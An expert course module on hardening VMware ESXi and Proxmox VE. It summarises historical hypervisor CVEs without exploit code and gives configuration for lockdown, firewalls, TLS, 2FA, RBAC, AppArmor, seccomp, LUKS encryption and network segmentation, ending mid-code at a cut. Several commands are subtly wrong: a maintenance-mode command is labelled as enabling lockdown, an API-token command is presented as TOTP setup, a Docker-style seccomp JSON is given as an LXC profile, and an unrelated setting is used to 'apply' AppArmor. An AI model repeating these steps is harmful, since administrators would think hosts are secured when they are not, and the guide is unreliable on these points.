# Hypervisor Security Hardening — VMware ESXi and Proxmox VE

> **Modulo del corso:** Migrazione VMware → Proxmox VE
> **Posizione nel percorso:** Fase 9 — Sicurezza avanzata · Modulo 20 (nuovo)
> **Prerequisiti:** moduli 01-02 (fondamenti VMware e Proxmox), modulo 12 (sicurezza e compliance), familiarita con architettura x86-64, CPU virtualization extensions (VT-x/AMD-V), UEFI/TPM, Linux kernel security subsystems (SELinux, AppArmor, seccomp), networking L2-L4, PKI/TLS.
> **Obiettivi di apprendimento.** Al termine del modulo lo studente sara in grado di:
> 1. classificare le superfici d'attacco di un hypervisor Type-1 e mappare CVE storici a ciascun vettore;
> 2. eseguire hardening completo di ESXi (lockdown mode, firewall, Secure Boot, TPM attestation, vSphere Trust Authority);
> 3. eseguire hardening completo di Proxmox VE (TLS, 2FA, RBAC, firewall multi-livello, AppArmor, seccomp, LUKS);
> 4. progettare network security per ambienti virtualizzati (microsegmentazione, SDN, PVLAN);
> 5. implementare storage encryption at-rest e in-transit con KMS integration;
> 6. configurare VM security features (vTPM 2.0, VBS, IOMMU isolation);
> 7. gestire patch lifecycle con zero-downtime e rollback;
> 8. verificare compliance CIS/STIG e automatizzare audit con PowerCLI e Ansible;
> 9. condurre penetration testing mirato a hypervisor e management plane;
> 10. progettare difesa in profondita con PAM, HSM, network segmentation, immutable infrastructure.
> **Tempo stimato:** lettura 120-180 min · implementazione hardening 2-4 settimane · assessment ciclico trimestrale
> **Livello:** expert (Dreyfus 5); offensive security awareness required
> **Ultimo aggiornamento:** 2026-05-07
> **Versioni di riferimento:** VMware ESXi 7.0 U3 / 8.0 U3; Proxmox VE 8.x; CIS Benchmark ESXi 7.0 v1.3 / 8.0 v1.0; DISA STIG vSphere 7/8.

---

## Mappa concettuale

```
+============================================================+
|     Hypervisor Security Hardening: layered defense          |
+============================================================+
|                                                            |
|   LAYER 1: HARDWARE ROOT OF TRUST                          |
|     TPM 2.0, Secure Boot, IOMMU, firmware integrity        |
|                                                            |
|   LAYER 2: HYPERVISOR KERNEL                               |
|     Lockdown mode, minimal services, patching              |
|                                                            |
|   LAYER 3: MANAGEMENT PLANE                                |
|     TLS, MFA, RBAC, API token scoping, audit logs          |
|                                                            |
|   LAYER 4: NETWORK                                         |
|     Microsegmentation, PVLAN, SDN, encrypted vMotion       |
|                                                            |
|   LAYER 5: STORAGE                                         |
|     Encryption at rest/transit, KMS, secure erasure         |
|                                                            |
|   LAYER 6: VM ISOLATION                                    |
|     vTPM, VBS, memory isolation, seccomp, AppArmor         |
|                                                            |
|   LAYER 7: MONITORING + COMPLIANCE                         |
|     CIS/STIG audit, SIEM, change tracking, pen testing     |
|                                                            |
+============================================================+
```

---

## 1. Hypervisor Attack Surface Analysis

### 1.1 Type-1 vs Type-2 Attack Surfaces

A Type-1 (bare-metal) hypervisor — ESXi, Proxmox/KVM, Xen — runs directly on hardware. Its attack surface is fundamentally different from a Type-2 (hosted) hypervisor like VirtualBox or VMware Workstation:

| Characteristic | Type-1 | Type-2 |
|---|---|---|
| Kernel exposure | Custom microkernel (ESXi) or hardened Linux (PVE) | Full desktop OS kernel |
| Driver surface | Minimal certified drivers | All host OS drivers |
| Management plane | Dedicated (vCenter, pveproxy) | Host OS services |
| Guest-to-host attack path | VMX/qemu process → hypervisor kernel | VM process → host kernel (full OS) |
| Hardware isolation | Direct IOMMU, VT-x control | OS-mediated |
| Patch cadence | Dedicated hypervisor patches | OS + hypervisor patches |

**Key insight for defenders:** Type-1 hypervisors have a smaller kernel attack surface but their management plane (vCenter, pveproxy) represents a high-value target — compromise of management is equivalent to compromise of every hosted VM.

### 1.2 Historical Hypervisor Escapes and Critical CVEs

#### CVE-2015-3456 — VENOM (Virtual Environment Neglected Operations Manipulation)

- **Affected:** QEMU virtual floppy disk controller (FDC)
- **Impact:** Guest-to-host escape via buffer overflow in FDC I/O port handling
- **CVSS:** 7.7 (High)
- **Root cause:** Legacy device emulation code with insufficient bounds checking on FIFO buffer
- **Affected platforms:** KVM, Xen, QEMU-based (Proxmox indirectly)
- **Lesson:** Legacy device emulation is a persistent attack surface. Disable unused virtual hardware.

#### CVE-2017-5715 — Spectre Variant 2 (Branch Target Injection)

- **Affected:** All modern CPUs with speculative execution
- **Impact:** Cross-VM side-channel information disclosure; guest can read host/other guest memory via branch predictor manipulation
- **CVSS:** 5.6 (Medium) — elevated severity in multi-tenant environments
- **Mitigations:** Retpoline, IBRS/IBPB microcode, STIBP for SMT, kernel patches
- **Hypervisor relevance:** Multi-tenant environments where VMs from different trust domains share physical cores are directly exposed. SMT (Hyperthreading) significantly increases risk.

#### CVE-2018-3646 — L1 Terminal Fault (L1TF) / Foreshadow

- **Affected:** Intel CPUs with L1 data cache
- **Impact:** Guest can read L1 cache contents belonging to hypervisor or other guests during context switches
- **CVSS:** 5.6 (Medium) — critical in cloud/multi-tenant
- **Mitigations:** L1d flush on VM entry, EPT inversion, disabling SMT in sensitive workloads
- **ESXi specific:** VMware released ESXi Side-Channel-Aware Scheduler as mitigation (performance cost 5-30%)

#### CVE-2020-3992 — ESXi OpenSLP Remote Code Execution

- **Affected:** VMware ESXi 6.5, 6.7, 7.0 — OpenSLP service
- **Impact:** Unauthenticated remote code execution with root privileges on ESXi host
- **CVSS:** 9.8 (Critical)
- **Root cause:** Use-after-free in SLP daemon listening on port 427/TCP+UDP
- **Exploitation:** Actively exploited by ransomware groups (ESXiArgs, Royal, BlackBasta)
- **Lesson:** Unnecessary network services are existential risks. SLP should have been disabled by default years before VMware deprecated it.

#### CVE-2021-21974 — ESXi OpenSLP Heap Overflow

- **Affected:** ESXi 6.5, 6.7, 7.0 (before patches)
- **Impact:** Unauthenticated remote code execution on management network via heap overflow in SLP
- **CVSS:** 8.8 (High)
- **Exploitation:** Mass exploitation February 2023 by ESXiArgs ransomware campaign; thousands of exposed hosts encrypted
- **Root cause:** Heap-based buffer overflow triggered by crafted SLP packets
- **Lesson:** Identical to CVE-2020-3992 — organizations that failed to patch or disable SLP after the first CVE were hit by the second. Patch velocity and service minimization are non-negotiable.

### 1.3 Attack Vectors Taxonomy

#### Management Plane Attacks

- **vCenter/pveproxy exploitation:** Web UI vulnerabilities, API injection, session hijacking
- **Credential theft:** LDAP/AD credential reuse, SAML token forgery (CVE-2022-31656 on vCenter)
- **Supply chain:** Compromised vCenter plugins, malicious ISOs on datastore
- **API abuse:** Overly permissive API tokens, lack of rate limiting

#### VM-to-Hypervisor (Guest Escape)

- **Device emulation bugs:** Virtual hardware (NIC, GPU, USB, disk controller) code flaws
- **Paravirtual driver exploits:** vmxnet3, virtio drivers shared memory corruption
- **Shared memory attacks:** Clipboard, drag-drop, shared folders as data exfiltration
- **VM communication channels:** vmci, vsock, QEMU guest agent as pivot points

#### Side-Channel Attacks

- **CPU cache attacks:** Spectre, Meltdown, MDS, L1TF, TAA
- **Timing attacks:** Keystroke timing via shared CPU scheduling
- **Memory deduplication attacks:** KSM/TPS-based page identification
- **Power/EM emanation:** Physical proximity attacks (less relevant for software hardening)

#### Supply Chain and Firmware

- **Firmware rootkits:** UEFI implants persist across OS reinstalls
- **Driver supply chain:** Compromised VIBs (ESXi) or DKMS modules (Proxmox)
- **Update channel hijacking:** Man-in-the-middle on patch repository connections
- **Hardware interdiction:** Implanted BMC/IPMI backdoors

---

## 2. ESXi Hardening

### 2.1 Lockdown Mode Configuration

Lockdown mode restricts host access to vCenter only, eliminating direct login vectors.

**Normal Lockdown Mode:**
- DCUI (Direct Console) access restricted to users in Exception Users list
- ESXi Shell and SSH disabled
- All management through vCenter only
- Local accounts can still authenticate if in Exception list

**Strict Lockdown Mode:**
- DCUI completely disabled
- No local access even for Exception Users
- If vCenter connectivity is lost, host requires physical console access to recover
- SSH is unconditionally blocked

```bash
# Enable Normal Lockdown via esxcli (from existing SSH session before lockdown)
esxcli system maintenanceMode set --enable true

# Check current lockdown status
vim-cmd hostsvc/hostsystem_get | grep -i lockdown

# Enable via PowerCLI
$vmhost = Get-VMHost -Name "esxi01.corp.local"
($vmhost | Get-View).EnterLockdownMode()

# For Strict Lockdown (PowerCLI):
$lockdownLevel = "lockdownStrict"
$vmhostView = $vmhost | Get-View
$hostAccessManager = Get-View $vmhostView.ConfigManager.HostAccessManager
$hostAccessManager.ChangeLockdownMode($lockdownLevel)
```

**Exception Users List** (critical for emergency access):

```powershell
# PowerCLI: Add exception user for emergency break-glass access
$vmhost = Get-VMHost "esxi01.corp.local"
$hostAccess = Get-View ($vmhost | Get-View).ConfigManager.HostAccessManager
$hostAccess.UpdateLockdownExceptions(@("emergency-admin"))
```

### 2.2 ESXi Firewall Configuration

ESXi uses a stateless firewall with predefined rulesets. Default policy: deny inbound, allow outbound.

```bash
# List all firewall rulesets
esxcli network firewall ruleset list

# Show rules within a specific ruleset
esxcli network firewall ruleset rule list --ruleset-id vSphereClient

# Disable unnecessary rulesets
esxcli network firewall ruleset set --enabled false --ruleset-id CIMSLP
esxcli network firewall ruleset set --enabled false --ruleset-id snmp
esxcli network firewall ruleset set --enabled false --ruleset-id CIMHttpServer
esxcli network firewall ruleset set --enabled false --ruleset-id CIMHttpsServer

# Restrict management access to specific IPs
esxcli network firewall ruleset set --allowed-all false --ruleset-id vSphereClient
esxcli network firewall ruleset allowedip add --ip-address 10.0.1.0/24 \
  --ruleset-id vSphereClient

# Restrict vCenter access
esxcli network firewall ruleset set --allowed-all false --ruleset-id vpxHeartbeats
esxcli network firewall ruleset allowedip add --ip-address 10.0.1.10/32 \
  --ruleset-id vpxHeartbeats

# Verify firewall status
esxcli network firewall get
# Expected: Enabled: true, Default Action: DROP
```

**Hardened firewall — PowerCLI automation:**

```powershell
# Harden firewall across all hosts in cluster
$cluster = Get-Cluster "Production"
$vmhosts = $cluster | Get-VMHost

foreach ($vmhost in $vmhosts) {
    $esxcli = Get-EsxCli -VMHost $vmhost -V2

    # Disable SLP (critical — CVE-2020-3992, CVE-2021-21974)
    $esxcli.network.firewall.ruleset.set.Invoke(@{
        enabled = $false
        rulesetid = "CIMSLP"
    })

    # Restrict SSH to jump host only
    $esxcli.network.firewall.ruleset.set.Invoke(@{
        allowedall = $false
        rulesetid = "sshServer"
    })
    $esxcli.network.firewall.ruleset.allowedip.add.Invoke(@{
        ipaddress = "10.0.1.5/32"
        rulesetid = "sshServer"
    })
}
```

### 2.3 SSH Hardening

SSH on ESXi should be disabled in production. When required for maintenance:

```bash
# /etc/ssh/sshd_config overrides (persistent via host profile)
# Restrict to key-based auth only
PasswordAuthentication no
ChallengeResponseAuthentication no
PermitRootLogin no
AllowUsers maintenance-user

# Protocol hardening
Protocol 2
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,ecdh-sha2-nistp384

# Timeout
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 30
MaxAuthTries 3
```

```bash
# Set SSH timeout (auto-disable after maintenance window)
esxcli system settings advanced set -o /UserVars/ESXiShellInteractiveTimeOut -i 900
esxcli system settings advanced set -o /UserVars/ESXiShellTimeOut -i 3600

# Start/stop SSH programmatically
vim-cmd hostsvc/enable_ssh
vim-cmd hostsvc/disable_ssh
```

### 2.4 Disabling Unnecessary Services

```bash
# Disable SLP (CRITICAL — most exploited ESXi service)
/etc/init.d/slpd stop
esxcli network firewall ruleset set --enabled false --ruleset-id CIMSLP
chkconfig slpd off

# Disable CIM server (if not using hardware monitoring via CIM)
esxcli system wbem set --enable false

# Disable SNMP (if not actively monitored via SNMP)
esxcli system snmp set --enable false

# Disable MOB (Managed Object Browser — debug interface)
vim-cmd internalsvc/refresh_services
# Via advanced setting:
esxcli system settings advanced set -o /Config/HostAgent/plugins/solo/enableMob -i 0

# Verify running services
esxcli system process list | grep -E "slpd|sfcbd|snmpd"
```

### 2.5 Host Profiles for Compliance

Host Profiles provide configuration-as-code for ESXi hardening:

```powershell
# PowerCLI: Create a reference host profile from hardened host
$refHost = Get-VMHost "esxi-hardened-reference.corp.local"
$profile = New-VMHostProfile -Name "CIS-Hardened-Profile-v1.3" `
  -Description "CIS ESXi 7.0 L1+L2 Benchmark Compliance" `
  -ReferenceHost $refHost

# Apply profile to all hosts in cluster
$cluster = Get-Cluster "Production"
$vmhosts = $cluster | Get-VMHost

foreach ($vmhost in $vmhosts) {
    Test-VMHostProfileCompliance -VMHost $vmhost -Profile $profile
    Apply-VMHostProfile -Entity $vmhost -Profile $profile -Confirm:$false
}

# Check compliance drift
$compliance = Test-VMHostProfileCompliance -VMHost (Get-VMHost)
$compliance | Where-Object { $_.IncomplianceElementList.Count -gt 0 } |
    Select-Object VMHost, IncomplianceElementList
```

### 2.6 vSphere Trust Authority

vSphere Trust Authority (vTA) separates the trust infrastructure from the managed cluster. Attestation hosts validate ESXi boot integrity before secrets (encryption keys) are released.

**Architecture:**

```
+---------------------+          +-----------------------+
| Trust Authority     |          | Workload Cluster      |
| Cluster (dedicated) |          | (managed ESXi hosts)  |
|                     |   attest |                       |
| - Attestation Svc   |<-------->| - TPM 2.0 chips       |
| - Key Provider Svc  |          | - Encrypted VMs       |
|                     |          |                       |
+---------------------+          +-----------------------+
         |
         | KMS integration
         v
+---------------------+
| External KMS        |
| (Thales, HyTrust,   |
|  HashiCorp Vault)   |
+---------------------+
```

```powershell
# PowerCLI: Configure Trust Authority
# Step 1: Export Trusted ESXi host information (on workload cluster)
$vmhost = Get-VMHost "esxi-workload01"
Export-TrustAuthoritySigningCertificate -VMHost $vmhost -FilePath "C:\ta\signcert.pem"
Export-TrustAuthorityTPM2EndorsementKey -VMHost $vmhost -FilePath "C:\ta\ek.pem"

# Step 2: Import into Trust Authority cluster
Import-TrustAuthorityPrincipal -TrustAuthorityCluster "TA-Cluster" `
  -SigningCertificatePath "C:\ta\signcert.pem"
Import-TrustAuthorityTPM2CA -TrustAuthorityCluster "TA-Cluster" `
  -CertificatePath "C:\ta\ek.pem"

# Step 3: Configure Key Provider on TA cluster
New-TrustAuthorityKeyProvider -TrustAuthorityCluster "TA-Cluster" `
  -Name "vault-kp" -KmsAddress "vault.corp.local" -KmsPort 5696
```

### 2.7 TPM Attestation and Secure Boot

```bash
# Verify TPM presence on ESXi host
esxcli hardware tpm get
# Output should show: TPM Version: 2.0, Status: Enabled

# Verify Secure Boot status
/usr/lib/vmware/secureboot/bin/secureBoot.py -s
# Expected: Secure Boot: Enabled

# Check boot integrity measurements
esxcli hardware tpm tag get

# Verify VIB acceptance levels (enforce signed only)
esxcli software acceptance get
# Should return: PartnerSupported or VMwareCertified (NOT CommunitySupported)

# Set acceptance level to reject unsigned VIBs
esxcli software acceptance set --level=PartnerSupported
```

**UEFI Secure Boot for VMs:**

```powershell
# PowerCLI: Enable Secure Boot on VM
$vm = Get-VM "windows-server-2022"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec
$spec.Firmware = "efi"
$spec.BootOptions = New-Object VMware.Vim.VirtualMachineBootOptions
$spec.BootOptions.EfiSecureBootEnabled = $true
($vm | Get-View).ReconfigVM($spec)
```

### 2.8 Encrypted vMotion

```powershell
# Set encrypted vMotion policy per VM
$vm = Get-VM "sensitive-workload"
$spec = New-Object VMware.Vim.VirtualMachineConfigSpec
$spec.MigrateEncryption = "required"  # Options: disabled, opportunistic, required
($vm | Get-View).ReconfigVM($spec)

# Cluster-wide: enforce encrypted vMotion via host profile or policy
# Verify encryption during live migration
Get-VMotion | Select-Object VM, Encryption, SourceHost, DestinationHost
```

---

## 3. Proxmox VE Hardening

### 3.1 pveproxy TLS Configuration

Proxmox VE management is exposed via pveproxy (port 8006). Default TLS configuration must be hardened:

```bash
# /etc/default/pveproxy — TLS hardening
CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
HONOR_CIPHER_ORDER=1
# Force TLS 1.2+ minimum
TLS_OPTIONS="NO_SSLv3,NO_TLSv1,NO_TLSv1_1"

# Custom certificate (replace self-signed)
# Place cert at /etc/pve/local/pveproxy-ssl.pem
# Place key at /etc/pve/local/pveproxy-ssl.key

# Restart pveproxy
systemctl restart pveproxy
```

**Let's Encrypt integration with ACME:**

```bash
# Configure ACME account
pvenode acme account register default ciupsciups@libero.it --directory \
  https://acme-v02.api.letsencrypt.org/directory

# Configure ACME plugin (DNS challenge for internal hosts)
pvenode acme plugin add dns cloudflare-plugin --api cf --data "CF_Token=<token>"

# Order certificate
pvenode acme cert order

# Auto-renewal is handled by pve-daily-update timer
systemctl status pve-daily-update.timer
```

### 3.2 Two-Factor Authentication

Proxmox supports TOTP, U2F, and WebAuthn as second factors:

```bash
# TOTP setup for user
pveum user token add admin@pam --comment "TOTP device"

# Configure TOTP realm-wide requirement
pveum realm modify pam --tfa type=totp

# WebAuthn configuration (preferred — phishing-resistant)
# /etc/pve/datacenter.cfg
cat >> /etc/pve/datacenter.cfg << 'EOF'
u2f: appid=https://pve.corp.local:8006,origin=https://pve.corp.local:8006
webauthn: rp=pve.corp.local,origin=https://pve.corp.local:8006,id=pve.corp.local
EOF

# Per-user WebAuthn enrollment via API
pvesh create /access/tfa --userid admin@pam --type webauthn \
  --description "YubiKey-5-NFC"
```

**Enforcing 2FA for all administrative users:**

```bash
# Create a group with mandatory TFA
pveum group add admins --comment "Administrators (TFA mandatory)"
pveum aclmod / -group admins -role Administrator

# Verify TFA status for all users
pvesh get /access/tfa | jq '.data[] | {userid, entries: [.entries[].type]}'
```

### 3.3 Role-Based Access Control (RBAC) with Granular Privileges

```bash
# Create custom role: VM Operator (start/stop/console, no config changes)
pveum role add VMOperator -privs "VM.Console VM.PowerMgmt VM.Monitor VM.Audit"

# Create custom role: Network Admin (network only, no VM access)
pveum role add NetworkAdmin -privs "Sys.Modify SDN.Allocate SDN.Audit"

# Create custom role: Backup Operator
pveum role add BackupOp -privs "VM.Backup Datastore.Allocate Datastore.AllocateSpace"

# Assign role to specific path (principle of least privilege)
pveum aclmod /vms/100 -user operator@pam -role VMOperator
pveum aclmod /sdn -user netadmin@pam -role NetworkAdmin
pveum aclmod /storage/pbs-backup -user backupsvc@pam -role BackupOp

# Verify effective permissions
pvesh get /access/permissions --userid operator@pam
```

### 3.4 API Token Scoping

```bash
# Create scoped API token (no full user privileges)
pveum user token add automation@pve monitoring-token \
  --privsep 1 --comment "Read-only monitoring"
# privsep=1 means token gets its own ACL, not the user's

# Grant token specific minimal permissions
pveum aclmod / -token 'automation@pve!monitoring-token' -role PVEAuditor

# Create token for backup automation (limited scope)
pveum user token add backup-svc@pve backup-token --privsep 1
pveum aclmod /storage -token 'backup-svc@pve!backup-token' -role BackupOp
pveum aclmod /vms -token 'backup-svc@pve!backup-token' -role PVEVMAdmin

# Token expiry (manual rotation policy required)
# Proxmox tokens don't expire automatically — implement rotation via cron
# /etc/cron.monthly/rotate-api-tokens
```

### 3.5 Firewall Configuration — Datacenter/Host/VM Levels

Proxmox has a three-tier firewall: datacenter → host → VM interface.

**Datacenter level** (`/etc/pve/firewall/cluster.fw`):

```ini
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
log_ratelimit: enabled=1,rate=1/second,burst=5

[IPSET management]
10.0.1.0/24
10.0.2.5

[RULES]
# Allow management access from trusted network only
IN ACCEPT -source +management -dest +management -p tcp -dport 8006 -log info
IN ACCEPT -source +management -p tcp -dport 22 -log info
# Allow corosync cluster communication
IN ACCEPT -p udp -dport 5405:5412
# Allow SPICE/VNC console from management network
IN ACCEPT -source +management -p tcp -dport 5900:5999
# Allow live migration traffic (dedicated network)
IN ACCEPT -source 10.0.100.0/24 -p tcp -dport 60000:60050
# Drop everything else (implicit with policy_in: DROP)
```

**Host level** (`/etc/pve/nodes/<node>/host.fw`):

```ini
[OPTIONS]
enable: 1
log_level_in: info
log_level_out: nolog
nf_conntrack_max: 262144
protection_synflood: 1
protection_synflood_rate: 200
protection_synflood_burst: 1000

[RULES]
# SSH only from jump host
IN ACCEPT -source 10.0.1.5/32 -p tcp -dport 22 -log info
# SNMP from monitoring (if needed)
IN ACCEPT -source 10.0.3.10/32 -p udp -dport 161
# Block ICMP flood but allow ping
IN ACCEPT -p icmp -icmp-type 8 -limit rate=10/second
IN DROP -p icmp -log warning
```

**VM level** (per-interface in VM config or via API):

```bash
# Apply firewall profile to VM 100, interface net0
pvesh set /nodes/pve01/qemu/100/firewall/options --enable 1 --policy_in DROP
pvesh create /nodes/pve01/qemu/100/firewall/rules \
  --type in --action ACCEPT --proto tcp --dport 443 \
  --comment "HTTPS inbound" --enable 1
pvesh create /nodes/pve01/qemu/100/firewall/rules \
  --type in --action ACCEPT --proto tcp --dport 22 \
  --source 10.0.1.0/24 --comment "SSH from mgmt" --enable 1
```

### 3.6 AppArmor Profiles for Containers (LXC)

```bash
# Default AppArmor profile for LXC: /etc/apparmor.d/lxc/lxc-default-cgns
# Custom hardened profile for sensitive containers:

cat > /etc/apparmor.d/lxc/lxc-hardened << 'EOF'
#include <tunables/global>

profile lxc-hardened flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/lxc/container-base>

  # Deny dangerous capabilities
  deny capability sys_admin,
  deny capability sys_rawio,
  deny capability sys_ptrace,
  deny capability net_admin,

  # Deny access to host /proc and /sys sensitive entries
  deny /proc/kcore r,
  deny /proc/sysrq-trigger rw,
  deny /sys/firmware/** rw,
  deny /sys/kernel/security/** rw,

  # Deny mount operations
  deny mount,
  deny umount,

  # File access restrictions
  /usr/** r,
  /etc/** r,
  /var/** rw,
  /tmp/** rw,
  /run/** rw,

  # Network: allow basic
  network inet stream,
  network inet dgram,
  network inet6 stream,
  network inet6 dgram,
  # Deny raw sockets
  deny network raw,
  deny network packet,
}
EOF

apparmor_parser -r /etc/apparmor.d/lxc/lxc-hardened

# Apply to container 200
# In /etc/pve/lxc/200.conf:
# lxc.apparmor.profile: lxc-hardened
pvesh set /nodes/pve01/lxc/200/config --unprivileged 1
```

### 3.7 Seccomp Filters

```bash
# QEMU seccomp is enabled by default in Proxmox VE 8.x
# Verify in qemu process args:
ps aux | grep qemu | grep -o "seccomp=[^ ]*"
# Expected: -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny

# For LXC containers, additional seccomp profile:
cat > /etc/pve/lxc/seccomp-strict.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "archMap": [
    { "architecture": "SCMP_ARCH_X86_64", "subArchitectures": ["SCMP_ARCH_X86"] }
  ],
  "syscalls": [
    {
      "names": ["read","write","open","close","stat","fstat","lstat",
                "poll","lseek","mmap","mprotect","munmap","brk",
                "ioctl","access","pipe","select","sched_yield",
                "mremap","msync","clone","execve","exit","wait4",
                "kill","uname","fcntl","flock","fsync","fdatasync",
                "truncate","getdents","getcwd","chdir","mkdir","rmdir",
                "creat","link","unlink","chmod","chown","umask",
                "gettimeofday","getrlimit","getrusage","sysinfo",
                "times","getuid","getgid","geteuid","getegid",
                "socket","connect","accept","sendto","recvfrom",
                "bind","listen","shutdown","setsockopt","getsockopt",
                "getpeername","getsockname","epoll_create","epoll_ctl",
                "epoll_wait","clock_gettime","exit_group","openat",
                "mkdirat","unlinkat","renameat","readlinkat","fchownat",
                "fchmodat","newfstatat","epoll_create1","pipe2",
                "accept4","dup3","signalfd4","eventfd2","timerfd_create",
                "timerfd_settime","getrandom","memfd_create","futex",
                "set_robust_list","get_robust_list","nanosleep",
                "clock_nanosleep","restart_syscall","prctl","arch_prctl",
                "setitimer","set_tid_address","rt_sigaction",
                "rt_sigprocmask","rt_sigreturn","sigaltstack",
                "madvise","mincore","shmget","shmat","shmctl",
                "getpid","getppid","getpgrp","setsid","setpgid"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
EOF

# Reference in container config:
# lxc.seccomp.profile: /etc/pve/lxc/seccomp-strict.json
```

### 3.8 Storage Encryption with LUKS

```bash
# Encrypt local-lvm storage with LUKS2 during setup
# (Must be done at installation or with fresh disk)

# Create encrypted volume for VM storage
cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 \
  --key-size 512 --hash sha512 --iter-time 5000 /dev/sdb1

# Add key slot for automated unlock via TPM 2.0
systemd-cryptenroll --tpm2-device=auto /dev/sdb1

# Create /etc/crypttab entry for auto-unlock
echo "vm-encrypted UUID=$(blkid -s UUID -o value /dev/sdb1) none tpm2-device=auto" \
  >> /etc/crypttab

# Open and create LVM on encrypted volume
cryptsetup open /dev/sdb1 vm-encrypted
pvcreate /dev/mapper/vm-encrypted
vgcreate vg-encrypted /dev/mapper/vm-encrypted
lvcreate -l 100%FREE -n data -T vg-encrypted/data

# Add as Proxmox storage
pvesm add lvmthin encrypted-storage --vgname vg-encrypted \
  --thinpool data --content images,rootdir
```

---

## 4. Network Security in Virtualized Environments

### 4.1 vSwitch Security Policies (ESXi)

Three critical security policies on vSwitch/portgroup level:

| Policy | Default | Hardened | Risk if Enabled |
|--------|---------|----------|-----------------|
| Promiscuous Mode | Reject | Reject | VM can sniff all traffic on vSwitch |
| MAC Address Changes | Accept | Reject | VM can impersonate other MACs |
| Forged Transmits | Accept | Reject | VM can send frames with spoofed source MAC |

```powershell
# PowerCLI: Enforce security policies on all portgroups
$vSwitches = Get-VirtualSwitch -VMHost (Get-VMHost)
foreach ($vSwitch in $vSwitches) {
    $secPolicy = $vSwitch | Get-SecurityPolicy
    $secPolicy | Set-SecurityPolicy `
        -AllowPromiscuous $false `
        -MacChanges $false `
        -ForgedTransmits $false
}

# Per-portgroup override (for specific needs like IDS)
$pg = Get-VirtualPortGroup -Name "IDS-Monitoring"
$pg | Get-SecurityPolicy | Set-SecurityPolicy `
    -AllowPromiscuous $true `
    -MacChanges $false `
    -ForgedTransmits $false
```

### 4.2 Distributed Firewall (NSX-T / NSX 4.x)

NSX distributed firewall provides microsegmentation at the vNIC level:

```
# NSX-T Policy API: Create security group
POST /policy/api/v1/infra/domains/default/groups/db-servers
{
  "display_name": "DB-Servers",
  "expression": [{
    "resource_type": "Condition",
    "member_type": "VirtualMachine",
    "key": "Tag",
    "operator": "EQUALS",
    "value": "Scope|tier:database"
  }]
}

# Create DFW rule: only app-tier can reach db-tier on 5432
POST /policy/api/v1/infra/domains/default/security-policies/app-to-db
{
  "display_name": "App-to-DB",
  "category": "Application",
  "rules": [{
    "display_name": "Allow-PostgreSQL",
    "source_groups": ["/infra/domains/default/groups/app-servers"],
    "destination_groups": ["/infra/domains/default/groups/db-servers"],
    "services": ["/infra/services/PostgreSQL"],
    "action": "ALLOW",
    "logged": true
  }, {
    "display_name": "Default-Deny-DB",
    "source_groups": ["ANY"],
    "destination_groups": ["/infra/domains/default/groups/db-servers"],
    "action": "DROP",
    "logged": true
  }]
}
```

### 4.3 Proxmox SDN with VXLAN/EVPN

```bash
# Create VXLAN zone for tenant isolation
pvesh create /cluster/sdn/zones --zone tenant-a --type vxlan \
  --peers "10.0.100.1,10.0.100.2,10.0.100.3" \
  --bridge vmbr1 --mtu 1450

# Create EVPN zone (BGP-based, auto-learning)
pvesh create /cluster/sdn/zones --zone evpn-prod --type evpn \
  --controller evpn-ctrl --vrf-vxlan 5000 \
  --mac-prefix "BC:24:11" --bridge vmbr2

# Create VNet (virtual network) within zone
pvesh create /cluster/sdn/vnets --vnet vnet-db --zone tenant-a \
  --tag 1001 --alias "Database Network"

# Create subnet
pvesh create /cluster/sdn/vnets/vnet-db/subnets \
  --subnet 10.100.1.0/24 --gateway 10.100.1.1 \
  --type subnet --snat 0 --dnszoneprefix db

# Apply configuration
pvesh set /cluster/sdn --apply

# Assign VNet to VM
# In VM config: net0: virtio,bridge=vnet-db
```

### 4.4 Microsegmentation Implementation

```bash
# Proxmox security group for database tier
pvesh create /cluster/firewall/groups --group db-tier \
  --comment "Database tier microsegmentation"

# Rules within the security group
pvesh create /cluster/firewall/groups/db-tier/rules \
  --type in --action ACCEPT --proto tcp --dport 5432 \
  --source 10.100.2.0/24 --comment "PostgreSQL from app-tier" --enable 1

pvesh create /cluster/firewall/groups/db-tier/rules \
  --type in --action ACCEPT --proto tcp --dport 22 \
  --source 10.0.1.5/32 --comment "SSH from jump host" --enable 1

pvesh create /cluster/firewall/groups/db-tier/rules \
  --type in --action DROP --comment "Default deny all" --enable 1

# Apply security group to VM interface
# In /etc/pve/firewall/100.fw:
# [RULES]
# GROUP db-tier
```

### 4.5 VLAN Security — Hopping Prevention

```bash
# Proxmox: Prevent VLAN hopping by enforcing tagged-only interfaces
# In /etc/network/interfaces:
auto vmbr0
iface vmbr0 inet manual
    bridge-ports eno1
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    # Native VLAN should be an unused VLAN (dead VLAN)
    bridge-pvid 999
    bridge-vids 10 20 30 40 50

# VM interface: force specific VLAN tag
# In VM config: net0: virtio,bridge=vmbr0,tag=20
# The guest cannot escape VLAN 20

# ESXi: VLAN hopping prevention
# - Never use VLAN 1 (native) for production
# - Trunk only required VLANs to ESXi (switch-side)
# - Use VLAN 4095 (VGT) only when guest VLAN tagging is intentional
# - Physical switch: disable DTP, use "switchport mode trunk" explicitly
```

### 4.6 Private VLANs (PVLAN)

```powershell
# ESXi/vDS: Configure Private VLANs
$vds = Get-VDSwitch "Production-VDS"

# Create PVLAN: Primary 100, Isolated 101, Community 102
$pvlanConfig = @()
$pvlanConfig += New-Object VMware.Vim.VMwareDVSPvlanMapEntry -Property @{
    PrimaryVlanId = 100; SecondaryVlanId = 100; PvlanType = "promiscuous"
}
$pvlanConfig += New-Object VMware.Vim.VMwareDVSPvlanMapEntry -Property @{
    PrimaryVlanId = 100; SecondaryVlanId = 101; PvlanType = "isolated"
}
